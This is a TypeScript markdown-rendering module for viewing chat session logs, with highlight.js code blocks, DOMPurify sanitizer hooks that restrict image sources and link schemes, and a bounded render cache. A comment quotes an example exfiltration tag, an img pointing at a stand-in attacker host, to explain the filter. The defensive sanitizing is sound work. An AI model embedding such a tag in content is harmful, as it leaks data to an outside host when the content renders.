import { marked } from 'marked';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js/lib/common';

// `highlight.js/lib/common` bundles the 35 most-used languages (js, ts, py,
// go, rs, java, c/cpp, sql, bash, css, html, json, yaml, md, ...).

marked.setOptions({ gfm: true, breaks: true });

// Override the code renderer directly. marked-highlight in v18 was double-
// escaping our HTML — going via renderer.code we return HTML straight without
// marked touching it.

// Common language aliases people actually use in chat (claude includes python3,
// sh, etc). Map to whatever highlight.js calls the canonical name.
const LANG_ALIAS: Record<string, string> = {
  python3: 'python',
  py: 'python',
  sh: 'bash',
  shell: 'bash',
  zsh: 'bash',
  cs: 'csharp',
  'c#': 'csharp',
  yml: 'yaml',
  jsonc: 'json',
  jsx: 'javascript',
  tsx: 'typescript',
  proto: 'protobuf',
  dockerfile: 'dockerfile',
};

// Languages safe to use for auto-detect. We deliberately exclude xml/html
// because conversation content often contains tag-like strings that fool
// hljs into picking HTML and then double-escaping `<` everywhere.
const AUTO_LANGS = [
  'javascript', 'typescript', 'python', 'go', 'rust', 'java', 'csharp',
  'cpp', 'c', 'kotlin', 'swift', 'ruby', 'php', 'scala', 'perl',
  'bash', 'powershell', 'sql', 'json', 'yaml', 'toml', 'ini',
  'markdown', 'css', 'scss', 'less', 'lua', 'dart', 'haskell',
  'objectivec', 'r', 'matlab', 'makefile', 'dockerfile', 'nginx',
];

marked.use({
  renderer: {
    code(this: any, tokenOrCode: any, infoStr?: string): string {
      const rawCode: string = typeof tokenOrCode === 'string' ? tokenOrCode : (tokenOrCode?.text ?? '');
      // Defensive unescape — if upstream already html-escaped the source, hljs
      // would double-encode the entities. Safe to apply on raw text too.
      const code = htmlUnescape(rawCode);
      const rawLang: string = (typeof tokenOrCode === 'string' ? infoStr : tokenOrCode?.lang) || '';
      const langKey = (rawLang.match(/[\w#+.-]+/)?.[0] || '').toLowerCase();
      const aliased = LANG_ALIAS[langKey] || langKey;
      let highlighted: string;
      let usedLang = aliased;
      try {
        if (aliased && hljs.getLanguage(aliased)) {
          highlighted = hljs.highlight(code, { language: aliased, ignoreIllegals: true }).value;
        } else if (code.trim().length >= 4) {
          const r = hljs.highlightAuto(code, AUTO_LANGS);
          highlighted = r.value || htmlEscape(code);
          usedLang = r.language || '';
        } else {
          highlighted = htmlEscape(code);
        }
      } catch {
        highlighted = htmlEscape(code);
      }
      const cls = usedLang ? `hljs language-${usedLang}` : 'hljs';
      return `<pre><code class="${cls}">${highlighted}</code></pre>\n`;
    },
  },
});

function htmlEscape(s: string): string {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function htmlUnescape(s: string): string {
  return String(s)
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'");
}

// Hook DOMPurify once so every renderMarkdown() call benefits. Two filters:
// 1. <img src=...> — strip the src unless it's a data:image/* URL. Markdown
//    bodies come from local JSONL and ~/.claude config files, but a tampered
//    line could embed an `<img src="https://attacker/?leak">` that pings home
//    the moment it renders. Inline base64 images are still allowed because
//    that's how legitimate session screenshots round-trip.
// 2. <a href=...> — strip the href unless the scheme is http/https/mailto.
//    Stops `javascript:` / `file:` / custom-protocol redirects.
let _hooked = false;
function ensureSanitizerHooks() {
  if (_hooked) return;
  _hooked = true;
  DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
    if (data.attrName === 'src' && node.nodeName === 'IMG') {
      const v = String(data.attrValue || '');
      const ok = /^data:image\/(png|jpe?g|gif|webp|bmp);base64,[A-Za-z0-9+/]+={0,2}$/i.test(v);
      if (!ok) data.keepAttr = false;
    } else if (data.attrName === 'href' && node.nodeName === 'A') {
      const v = String(data.attrValue || '').trim().toLowerCase();
      const ok = v.startsWith('http://') || v.startsWith('https://') || v.startsWith('mailto:');
      if (!ok) data.keepAttr = false;
    }
  });
}

// marked + highlight.js + DOMPurify over one message runs in the low
// milliseconds, which is fine once and expensive on every render — and this is
// called straight out of a component body, so React re-renders it for reasons
// that have nothing to do with the text: a keystroke in the session list's
// filter box re-renders the detail pane and re-highlights every visible turn.
// The lazily-windowed list makes it worse, unmounting and remounting messages
// as the reader scrolls, which throws away anything a `useMemo` had held.
//
// The input is a message's immutable text and the output is a pure function of
// it (the sanitizer hooks are installed once and never vary), so the result can
// simply be kept. Bounded on both counts, because a session's messages can be
// megabytes and this must not become a leak that grows with reading time.
const RENDER_CACHE_MAX_ENTRIES = 400;
const RENDER_CACHE_MAX_CHARS = 8_000_000;
const renderCache = new Map<string, string>();
let renderCacheChars = 0;

function cacheRender(text: string, html: string) {
  // Never cache a single entry big enough to blow the budget on its own.
  if (text.length + html.length > RENDER_CACHE_MAX_CHARS / 4) return;
  renderCache.set(text, html);
  renderCacheChars += text.length + html.length;
  while (renderCache.size > RENDER_CACHE_MAX_ENTRIES || renderCacheChars > RENDER_CACHE_MAX_CHARS) {
    const oldest = renderCache.keys().next();
    if (oldest.done) break;
    const victim = renderCache.get(oldest.value) || '';
    renderCacheChars -= oldest.value.length + victim.length;
    renderCache.delete(oldest.value);
  }
}

export function renderMarkdown(text: string): string {
  const hit = renderCache.get(text);
  if (hit !== undefined) {
    // Refresh recency so the turns currently on screen aren't the ones evicted.
    renderCache.delete(text);
    renderCache.set(text, hit);
    return hit;
  }
  try {
    ensureSanitizerHooks();
    const html = marked.parse(text || '', { async: false }) as string;
    const clean = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['a','p','br','strong','em','del','code','pre','blockquote',
        'ul','ol','li','h1','h2','h3','h4','h5','h6',
        'table','thead','tbody','tr','td','th','hr','img','span'],
      ALLOWED_ATTR: ['href','title','alt','src','class'],
      ALLOW_DATA_ATTR: false,
    });
    cacheRender(text, clean);
    return clean;
  } catch {
    return escapeHtml(text);
  }
}

export function escapeHtml(s: string): string {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
